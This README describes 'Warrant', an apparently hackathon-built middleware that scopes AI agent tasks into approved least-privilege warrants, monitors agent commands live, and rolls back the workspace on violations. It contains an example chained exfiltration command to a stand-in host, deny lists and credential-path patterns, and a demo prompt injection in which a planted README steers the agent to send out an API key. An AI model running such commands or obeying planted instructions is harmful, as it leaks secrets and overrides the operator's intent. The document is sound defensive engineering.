# Warrant — Intent-Scoped Execution Warrants for AI Agents

**TikTok TechJam 2026 · Track 1 — Agent Launchpad: Design and Build Lightweight
Agent Middleware**

> An Agent may only do what it was actually asked to do.

Warrant is middleware built on top of the Volc Agent Launchpad Starter Kit. It
compiles every natural-language task into a machine-checkable **execution
warrant**, has a human approve that warrant, enforces it against the live Codex
event stream inside the Runtime path, and rolls the workspace back when an Agent
steps outside it.

The Starter Kit's Agent CRUD, Playground, lifecycle actions, persistence, and
model execution are unchanged and still work.

---

## The problem this middleware solves

Traditional middleware cannot protect an Agent platform, because **the dangerous
thing is not the command — it is the gap between the stated intent and the
executed action.**

```text
Task: "clean the build directory"     →  rm -rf build/    is correct
Task: "add one unit test"             →  rm -rf build/    is an attack
```

RBAC, a WAF, and seccomp all see the same syscall. None of them can express
"this action is unrelated to what the operator asked for". Every individual step
of a hijacked Agent run looks legitimate in isolation; only the relationship to
the original intent reveals the breach. That gap is where prompt injection, goal
hijacking, and silent over-reach live.

Warrant closes that gap by making intent a **first-class, enforceable artifact**.

---

## Design

Four layers. Every enforcement decision runs in the backend/Runtime path — never
in the UI.

### 1. Intent Compiler — before execution

`apps/server/src/warrant/compiler.ts`

Takes the operator's prompt plus the Agent's instructions and compiles them into
a least-privilege envelope via the Ark Responses API:

```jsonc
{
  "summary": "Create one test file under tests/ and run the suite once.",
  "writePaths": ["tests/**", "src/parser.ts"],
  "commands": ["npm", "node"],
  "denyCommands": ["rm", "curl", "wget", "chmod"],
  "networkEgress": false,
  "maxFileWrites": 5,
  "maxCommands": 8
}
```

The model output is parsed tolerantly and validated with zod. **Any failure —
bad JSON, wrong types, timeout, missing Ark key — falls back to a deterministic
least-privilege envelope.** The compiler can never fail open.

### 2. Human approval — the delegation boundary

The run is created with status `awaiting-warrant` and **does not execute**. The
operator reviews the exact scope in the browser and approves or rejects it. The
warrant is scoped, time-bound (30 min TTL), and revocable at any time.

This is the point where a human principal delegates bounded authority to an Agent
principal — rather than the Agent inheriting the operator's full session.

### 3. Conformance Monitor — during execution

`apps/server/src/warrant/monitor.ts` · `policy.ts`

The Starter Kit already parses a live Codex event stream in
`parseCodexEventLine` and keeps only the final message. Warrant
taps that same stream and evaluates every `command_execution`, `file_change`,
and `tool_call` **as it is emitted**, so a violation aborts the container
mid-flight instead of being discovered in a log afterwards.

The policy engine is a pure, deterministic function — no LLM in the hot path:

- **Shell-aware.** A command is split on `&&`, `||`, `;`, `|`, and newlines, and
  every segment is checked independently. `npm test && curl http://evil.sh` is
  blocked on the second segment.
- **Substitution-aware.** `$(...)` and backtick contents are lifted out and
  checked as their own segments.
- **Shell-wrapper transparent.** Codex wraps commands as `bash -lc "<script>"`;
  the wrapper is unwrapped recursively so the real command is evaluated, not the
  `bash` shell it hides behind.
- **Binary resolution.** Env assignments and `sudo` are skipped and directories
  stripped, so `FOO=bar sudo /usr/bin/curl` resolves to `curl`.
- **Deny-first ordering.** Warrant state → explicit deny → secret handling →
  network egress → allow-list → path scope → budgets.
- **Credential protection.** Any reference to `ARK_API_KEY`, `APP_AUTH_TOKEN`,
  `/proc/self/environ`, or a bare environment dump is blocked regardless of the
  allow-list.
- **Workspace containment.** Absolute paths and `..` traversal are rejected
  before glob matching.

### 4. Containment and recovery — after a violation

`apps/server/src/warrant/snapshot.ts`

The workspace is snapshotted with a SHA-256 digest before each run. On a
violation the platform kills the Runtime container, restores the workspace, and
re-computes the digest to **prove** the protected asset is byte-identical to its
pre-run state. The run is recorded as `blocked` with a containment record, and
the Agent returns to `ready` — the platform stays usable.

---

## Architecture

```mermaid
flowchart LR
    Task["Operator task<br/>natural language"]

    subgraph trusted["Trusted control plane"]
        direction TB
        Compiler["① Intent Compiler<br/>prompt → least-privilege scope"]
        Approval["② Human approval<br/>scoped · 30 min TTL · revocable"]
        Monitor["③ Conformance Monitor<br/>ENFORCEMENT POINT"]
        Recovery["④ Rollback + digest<br/>RECOVERY POINT"]
    end

    subgraph untrusted["Untrusted — Agent-controlled"]
        direction TB
        Container["Runtime container<br/>Codex CLI"]
        WS[("Agent workspace")]
    end

    Task --> Compiler
    Compiler -->|"warrant: pending"| Approval
    Approval -->|"approved: spawn"| Container
    Container -->|"command_execution<br/>file_change · tool_call"| Monitor
    Monitor -->|allow| Container
    Monitor -->|"block: kill container"| Recovery
    Container -->|writes| WS
    Recovery -->|"restore + verify digest"| WS
```

The trust boundary sits at the Runtime container edge. Everything the Agent
influences — its commands, its file writes, its tool calls — is untrusted input
that must cross the Conformance Monitor before it is allowed to continue.

---

## Demo: the positive and the negative case

### Positive — a warranted run completes

1. Create an Agent and send: `Add a unit test for the parser and summarise what you changed.`
2. The warrant appears. Note `no egress`, the narrow `writePaths`, and the budgets.
3. Select **Approve and run**.
4. The conformance trace fills in, each span tagged with the clause that
   permitted it. The run completes normally.

### Negative — prompt injection is contained

1. Plant a poisoned instruction inside the Agent workspace (a `README.md` that
   tells the Agent to POST `$ARK_API_KEY` to an external host).
2. Send the same benign task and approve the same warrant.
3. The Agent follows the injected instruction and attempts the exfiltration.
4. Warrant blocks it **mid-run**:
   - the Runtime container is force-removed,
   - the workspace is rolled back and the digest is confirmed to match,
   - the run is recorded as `blocked` against clause `scope.secretHandling`,
   - the trace shows exactly which step breached which clause.
5. Send a normal task again — the Agent is `ready` and the platform still works.

---

## Run the demo without a model

The middleware can be demonstrated and tested with **no Ark key, no Docker, and
no Codex CLI** — a replay runtime feeds a recorded Codex event stream through the
real parser, policy engine, monitor, and rollback path.

```bash
npm run demo
```

This runs a benign task (passes), an injected credential-exfiltration task
(blocked mid-run and rolled back), and a recovery task (the platform still
works), asserting every invariant. See [demo/README.md](demo/README.md) for the
in-browser walkthrough and the real-Codex path.

## Quick start

Requirements: Node.js 22+, npm 10+, one of Docker / Colima / Podman, and an Ark
API key with a Responses-capable endpoint.

```bash
ARK_API_KEY=your-ark-api-key ARK_MODEL=ep-your-endpoint-id npm run poc
```

Open <http://localhost:3000>. Codex CLI ships inside the Runtime image and is
not required on the host.

> `ARK_API_KEY` must be an **Ark model API key**, not a BytePlus account AK/SK.
> `ARK_MODEL` is normally an endpoint ID beginning with `ep-`. A wrong
> credential returns 401 from the Ark Responses API.

### Warrant configuration

| Variable | Default | Purpose |
| --- | --- | --- |
| `WARRANT_AUTO_APPROVE` | `false` | Approve compiled warrants automatically. Set `true` to restore the unmediated baseline flow or to run CI. |
| `WARRANT_TRACE_LIMIT` | `5000` | Maximum retained trace spans; older spans are trimmed. |

### API

| Method | Route | Purpose |
| --- | --- | --- |
| `GET` | `/api/runs/:id/trace` | Conformance spans with per-span verdicts. |
| `GET` | `/api/agents/:id/warrants` | Warrant history for an Agent. |
| `GET` | `/api/warrants/:id` | One warrant. |
| `POST` | `/api/warrants/:id/decision` | `{ "approve": boolean }` |
| `POST` | `/api/warrants/:id/revoke` | Revoke and cancel the attached run. |

---

## Validation

```bash
npm run check
```

Runs TypeScript checks, the full test suite, and both production builds.

Automated evidence covers the core policy and containment behaviour rather than
UI rendering:

| Suite | Covers |
| --- | --- |
| `warrant/policy.test.ts` | Warrant state, chained commands, substitutions, credential references, deny-list precedence, path escapes, budgets. |
| `warrant/monitor.test.ts` | Real Codex event shapes, block-on-first-violation, `started`/`completed` de-duplication. |
| `warrant/snapshot.test.ts` | Rollback restores exactly; digest mismatch is detected. |
| `warrant/compiler.test.ts` | Tolerant parsing, schema rejection, fail-closed fallback. |
| `agent-service.test.ts` | End-to-end: approval gate, rejection, revocation, exfiltration blocked → rolled back → Agent still usable, trace names the violated clause. |

The end-to-end tests drive the **real** parser, monitor, policy engine, and
rollback path; only process/container spawning is substituted.

---

## Limitations and residual risk

- **Enforcement is containment, not syscall interception.** Warrant observes
  the Codex event stream: commands are judged at `item.started` and the container
  is killed on violation, but a very fast side effect can land before teardown
  and is then recovered by rollback rather than prevented outright. File writes
  are always caught at report time and undone.
- **The allow-list constrains which programs run, not every effect.** A
  name-based allow-list cannot fully bound an interpreter, so it is backed by
  secret-reference scanning, network-binary denial, inline-eval (`node -e`,
  `python -c`) blocking, and file-write checks that apply no matter which command
  produced the write. A warranted binary can still take a permitted-but-unintended
  action inside its scope.
- **The compiler is advisory, the enforcement is not.** A poorly compiled
  warrant can be too permissive. The human approval step and the deterministic
  fallback floor exist for exactly this reason, and the operator sees the full
  scope before approving.
- **File changes are detected at report time.** Codex reports a `file_change`
  after applying it, so containment for writes is *rollback*, not prevention.
  Command execution is intercepted at `item.started`, before the effect lands.
- **Revocation cancels the run**; it does not retroactively undo already-allowed
  actions in that run.
- **The JSON store is single-process**, inherited from the Starter Kit.
- **An ordinary container is not a hardened multi-tenant boundary.** Warrant
  reduces what a compromised Agent may attempt; it does not replace isolation.
- Trace details are truncated to 400 characters; secrets are never persisted
  because credential-referencing actions are blocked before they execute.

## What was intentionally not built

No foundation-model training, no workflow editor, no production OAuth, no
general-purpose sandbox, no multi-region deployment. ECS deployment is untouched
and optional — local container execution is the judging path.

---

## Starter Kit documentation

Setup, deployment, and baseline platform details are unchanged:

- [Local POC](docs/LOCAL_POC.md)
- [Deployment](docs/DEPLOYMENT.md)
- [Baseline architecture](docs/ARCHITECTURE.md)
- [Security policy](SECURITY.md)

### Docker Compose

```bash
./scripts/bootstrap-local.sh
docker compose up --build
```

### Development

```bash
npm install
cp .env.example .env
npm run dev
```

Web UI on <http://localhost:5173>, API on <http://localhost:3000>.

## License

[MIT](LICENSE)
